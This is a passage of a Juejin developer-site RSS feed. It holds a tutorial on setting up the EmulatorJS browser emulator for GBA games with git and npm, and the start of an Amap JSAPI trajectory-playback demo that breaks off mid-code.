<p>下次写结构体时，问自己一句：「这个类型有合理的默认值吗？」有的话，加个 <code>#[derive(Default)]</code>，你的用户会感谢你的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[怀旧游戏模拟器，我选EmulatorJS]]></title>    <link>https://juejin.cn/post/7596905751111073855</link>    <guid>https://juejin.cn/post/7596905751111073855</guid>    <pubDate>2026-01-19T17:37:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905751111073855" data-draft-id="7596934200580620324" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="怀旧游戏模拟器，我选EmulatorJS"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T17:37:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="德育处主任"/> <meta itemprop="url" content="https://juejin.cn/user/2673620576140030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            怀旧游戏模拟器，我选EmulatorJS
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2673620576140030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    德育处主任
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:37:49.000Z" title="Mon Jan 19 2026 17:37:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>点赞 + 关注 + 收藏 = 学会了</strong></p>
<p>你有多久没打电动了？还记得小时候玩过什么游戏吗？</p>
<p>我是90后，第一次接触的游戏机是小霸王，玩的就是红白机这代的游戏。但真正给我生成情怀的还得是 GBA。口袋妖怪红绿蓝、金银水晶，再到后面的火红叶绿和各种宝石；马里奥赛车；龙珠大冒险；舞空斗剧。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/949226e3cb5c4e52982205c0410d064e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=6goCDvrUKM%2F0t6DfQHRzqd8s7B8%3D" alt="01.png" loading="lazy"/></p>
<p>时间长了多少有点怀念了。那么有没有一种可能，一个“客户端”能包含N台游戏机模拟器呢？我找到 EmulatorJS。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f31d737de94b4f3b8fb9a8bad0c38f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=BsTvVqlzzNF%2F6Bj%2BnqkefsU%2BQ5Q%3D" alt="02.png" loading="lazy"/></p>
<ul>
<li>EmulatorJS GitHub 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmulatorJS%2FEmulatorJS" target="_blank" title="https://github.com/EmulatorJS/EmulatorJS" ref="nofollow noopener noreferrer">github.com/EmulatorJS/…</a></li>
<li>EmulatorJS 文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Femulatorjs.org%2F" target="_blank" title="https://emulatorjs.org/" ref="nofollow noopener noreferrer">emulatorjs.org/</a></li>
</ul>
<h2 data-id="heading-0">下载 EmulatorJS</h2>
<p>在电脑安装 EmulatorJS 的方法很简单。</p>
<p>首先电脑需要安装 Node.js 环境，打开 Node.js 官网（<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F%25EF%25BC%2589%25E7%259B%25B4%25E6%258E%25A5%25E4%25B8%258B%25E8%25BD%25BD%25E5%25AE%2589%25E8%25A3%2585%25E5%25A5%25BD%25E5%25B0%25B1%25E8%25A1%258C%25EF%25BC%2588%25E5%25BE%2588%25E7%25AE%2580%25E5%258D%2595%25EF%25BC%258C%25E6%2588%2591%25E4%25B8%258D%25E8%25B4%25B4%25E6%2595%2599%25E7%25A8%258B%25E4%25BA%2586%25EF%25BC%2589%25E3%2580%2582" target="_blank" title="https://nodejs.org/%EF%BC%89%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%A5%BD%E5%B0%B1%E8%A1%8C%EF%BC%88%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E6%88%91%E4%B8%8D%E8%B4%B4%E6%95%99%E7%A8%8B%E4%BA%86%EF%BC%89%E3%80%82" ref="nofollow noopener noreferrer">nodejs.org/）直接下载安装好就行（…</a></p>
<p>接着打开 EmulatorJS 的代码仓库（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmulatorJS%2FEmulatorJS%25EF%25BC%2589%25EF%25BC%258C%25E7%2594%25A8%25E4%25B8%258B%25E9%259D%25A2%25E8%25BF%2599%25E5%25A5%2597%25E5%2591%25BD%25E4%25BB%25A4%25E6%258A%258A%25E4%25BB%25A3%25E7%25A0%2581%25E5%2585%258B%25E9%259A%2586%25E5%2588%25B0%25E6%259C%25AC%25E5%259C%25B0%25E3%2580%2582" target="_blank" title="https://github.com/EmulatorJS/EmulatorJS%EF%BC%89%EF%BC%8C%E7%94%A8%E4%B8%8B%E9%9D%A2%E8%BF%99%E5%A5%97%E5%91%BD%E4%BB%A4%E6%8A%8A%E4%BB%A3%E7%A0%81%E5%85%8B%E9%9A%86%E5%88%B0%E6%9C%AC%E5%9C%B0%E3%80%82" ref="nofollow noopener noreferrer">github.com/EmulatorJS/…</a></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> git@github.com:EmulatorJS/EmulatorJS.git
</code></pre>
<p>如果你电脑没安装 git 工具，在浏览器打开 EmulatorJS 的 GitHub 地址，下载 ZIP 文件到电脑，然后解压就行。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ef326b74cf64d659c89fc062855d003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=5TyBFvHre6xeoHecyb%2Bn5Yk9rrc%3D" alt="03.png" loading="lazy"/></p>
<h2 data-id="heading-1">安装依赖</h2>
<p>EmulatorJS 代码下载成功后，接下来需要使用 <code>npm</code> 下载 EmulatorJS 项目用到的依赖文件（一些工具类的代码）。所以要安装好 Node.js 环境。</p>
<p>装好 Node.js 环境后，打开终端，进入到 EmulatorJS 项目的目录。</p>
<ul>
<li>在终端可以通过 <code>cs xxxxxx</code> 的方式进入 EmulatorJS。</li>
<li>在 Windows 也可以打开 EmulatorJS 文件夹，然后右键，打开终端。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/717fbe94d20b45dd9821c4a2be9dbf5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=jfbLW33qbdV0sEoPppM42TgkltY%3D" alt="04.png" loading="lazy"/></p>
<p>打开终端后，输入以下代码安装 EmulatorJS 的依赖文件。</p>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span>
</code></pre>
<p>如果网络没问题的话，安装好依赖文件后，EmulatorJS 目录下会出现一个 node_modules 文件夹，里面就是 EmulatorJS 需要用到的依赖文件。</p>
<p>其实安装好依赖后就可以运行 EmulatorJS 了，但如果你想在“不联网”的情况下也能运行 EmulatorJS，还需要下载指定模拟器的文件。</p>
<p>模拟器文件在这里：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.emulatorjs.org%2Fnightly%2Fdata%2Fcores" target="_blank" title="https://cdn.emulatorjs.org/nightly/data/cores" ref="nofollow noopener noreferrer">cdn.emulatorjs.org/nightly/dat…</a></p>
<p>你想运行哪台游戏机，就下载对应的文件。</p>
<p>比如我想玩 GBA，那就搜索“gba”。如果要兼容老浏览器，那就下载 <code>xxx-legacy-wasm.data</code> 这类文件，如果你用的是最新版的 Chrome，直接下载 <code>mgba-wasm.data</code> 也行。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b3738f55be446a9a5e7905f900e1622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=eEQBFigSyX9YKOEtN6YkeXKDUmA%3D" alt="05.png" loading="lazy"/></p>
<p>把模拟器文件放到 EmulatorJS 项目的这个地方，以后就可以离线运行 EmulatorJS 了。</p>
<pre><code class="hljs language-bash" lang="bash">EmulatorJS/data/cores
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac28134f3dd94edc9f9c6303aece96ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=ARVcgSmScbc3gSPr25l6qONkfHk%3D" alt="06.png" loading="lazy"/></p>
<p>我想玩 GBA，所以我就只放了 <code>mgba-legacy-wasm.data</code> 进来。</p>
<p>如果无法打开模拟器文件的网址，我也准备了一份放在百毒碗盘。</p>
<pre><code class="hljs">🐱：喵喵嗨嘻咪喵呀呦喵喵呀嘤咪喵呀咪喵咪呀哇咪咪哇哼喵喵喔咝喵喵咕嘶咪咪啊咪咪喵嘿嗷喵咪嘿咔喵喵咕咔喵喵嘿咕喵喵嘿呜咪咪嗨嗝喵咪嘿呦喵喵呀嗯喵咪咕咔咪喵嘿哇咪喵嗨咝咪咪嘿哒喵喵喔嘶喵喵呀哇咪咪喔咝咪咪哇呜咪咪嗯呀喵咪嘤嘟咪喵嘿咝喵咪呦嗡喵喵哈哈喵喵嘤哒咪喵啊哇喵咪嘿嘤喵咪嘛喔喵喵嘤咩喵咪嘤嗯喵咪嘿哒咪咪嘿喔咪咪嘤哇喵咪嘿嘤咪喵呦啊喵喵呦嗯咪喵嘤呦喵咪嗨啪咪咪呦喔咪喵嗨咕喵喵呦呜咪咪哇咝咪喵啊喵喵咪啊啊咪咪嘿嘤咪喵哈哒喵咪嗨啊咪咪嗨咕喵咪嘿嗷咪咪啊哼
</code></pre>
<p>复制上面这段内容，到「光刻符文」小软体，选择“符文 - 土猫”解开吧。直接发百毒的🔗怕某些平台不给过。</p>
<h2 data-id="heading-2">运行 EmulatorJS</h2>
<p>安装好所有依赖文件后，在终端输入这条命令按回车键就可以运行 EmulatorJS 了。</p>
<pre><code class="hljs language-bash" lang="bash">npm run start
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9350e9b928714718ac8b7866c5c31370~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=Pz7ycMaZ8npZrMsj8FQFKK0jqKc%3D" alt="07.png" loading="lazy"/></p>
<p>把游戏拖进去就可以直接运行了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0845218fe00a47c69756cce64e171af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=Nnld5xMYdFFDFODmIjGIgsR5J8k%3D" alt="08.png" loading="lazy"/></p>
<p>以 GBA 为例，可以随时保存和读取游戏进度。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b6b9637072d4968a1650478ec0f73b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=t35SR7L62g3HWqgmZ7Wk8MkOms4%3D" alt="09.png" loading="lazy"/></p>
<p>其他功能就不多介绍了，自己研究吧～</p>
<hr/>
<p><strong>点赞 + 关注 + 收藏 = 学会了</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[高德轨迹更新效果]]></title>    <link>https://juejin.cn/post/7596934200580669476</link>    <guid>https://juejin.cn/post/7596934200580669476</guid>    <pubDate>2026-01-19T17:45:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596934200580669476" data-draft-id="7596896373054128191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="高德轨迹更新效果"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-19T17:45:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梦飞君"/> <meta itemprop="url" content="https://juejin.cn/user/3804726432118366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            高德轨迹更新效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3804726432118366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梦飞君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:45:41.000Z" title="Mon Jan 19 2026 17:45:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>高德轨迹更新效果</strong></h2>
<p>基于高德地图 JSAPI 2.0 开发的轨迹回放系统，支持实时轨迹点加载、平滑动画播放、轨迹可视化等功能。</p>
<h2 data-id="heading-1">主要功能</h2>
<ul>
<li>🎯 <strong>轨迹回放动画</strong> - 平滑的移动动画，自动旋转，地图跟随</li>
</ul>
<h6 data-id="heading-2">图片效果</h6>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef0b52ad148348acaf34394d2182ef49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6aOe5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449543&amp;x-signature=qz1WUlqVGCzY2l1ZlfeTyQvInUo%3D" alt="b3ab5f25-768e-4df0-b3d9-3616ba53dd00.png" loading="lazy"/></p>
<p>代码附上：</p>
<pre><code class="hljs language-js" lang="js">&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
    &lt;meta name="viewport" content="initial-scale=1.0, user-scalable=no, width=device-width"&gt;
    &lt;title&gt;轨迹回放&lt;/title&gt;
    &lt;link rel="stylesheet" href="https://a.amap.com/jsapi_demos/static/demo-center/css/demo-center.css"/&gt;
    &lt;style&gt;
        html, body, #container {
            height: 100%;
            width: 100%;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="container"&gt;&lt;/div&gt;
&lt;script type="text/javascript" src="https://webapi.amap.com/maps?v=2.0&amp;key=YOUR_API_KEY"&gt;&lt;/script&gt;
&lt;script&gt;
    // JSAPI2.0 使用覆盖物动画必须先加载动画插件
    AMap.plugin('AMap.MoveAnimation', function(){
        // 完整的轨迹点数据（模拟远程数据源）
        var allTrajectoryPoints = [
            [116.478935,39.997761],
            [116.478939,39.997825],
            [116.478912,39.998549],
            [116.478912,39.998549],
            [116.478998,39.998555],
            [116.478998,39.998555],
            [116.479282,39.99856],
            [116.479658,39.998528],
            [116.480151,39.998453],
            [116.480784,39.998302],
            [116.480784,39.998302],
            [116.481149,39.998184],
            [116.481573,39.997997],
            [116.481863,39.997846],
            [116.482072,39.997718],
            [116.482362,39.997718],
            [116.483633,39.998935],
            [116.48367,39.998968],
            [116.484648,39.999861]
        ];

        var marker;
        var currentPath = []; // 当前已加载的轨迹点
        var loadedIndex = 0; // 已加载的轨迹点索引
        var batchSize = 3; // 每次加载的轨迹点数量
        var loadInterval = null; // 定时器
        var isAnimating = false; // 标记是否正在动画中

        var map = new AMap.Map("container", {
            resizeEnable: true,
            center: [116.397428, 39.90923],
            zoom: 17
        });

        marker = new AMap.Marker({
            map: map,
            position: allTrajectoryPoints[0],
            icon: "https://a.amap.com/jsapi_demos/static/demo-center-v2/car.png",
            offset: new AMap.Pixel(-13, -26),
        });

        // 只保留已走过轨迹线
        var passedPolyline = new AMap.Polyline({
            map: map,
            strokeColor: "#FF8000",  //线颜色
            strokeWeight: 6,      //线宽
        });

        // 维护一个累积的已走过路径数组，确保轨迹线一直显示
        var accumulatedPassedPath = [allTrajectoryPoints[0]];
        var lastRecordedPosition = allTrajectoryPoints[0]; // 上次记录的位置

        // 初始化时设置已走过轨迹为起点
        passedPolyline.setPath(accumulatedPassedPath);
        currentPath.push(allTrajectoryPoints[0]);
        loadedIndex = 1;

        marker.on('moving', function (e) {
            // 获取当前marker的位置
            var currentPos = e.target.getPosition();
            var currentPosArray = [currentPos.lng, currentPos.lat];
            
            // 计算与上次记录位置的距离
            var dist = Math.sqrt(
                Math.pow(currentPosArray[0] - lastRecordedPosition[0], 2) + 
                Math.pow(currentPosArray[1] - lastRecordedPosition[1], 2)
            );
            
            // 如果移动距离超过阈值（避免重复添加太近的点），添加到累积路径
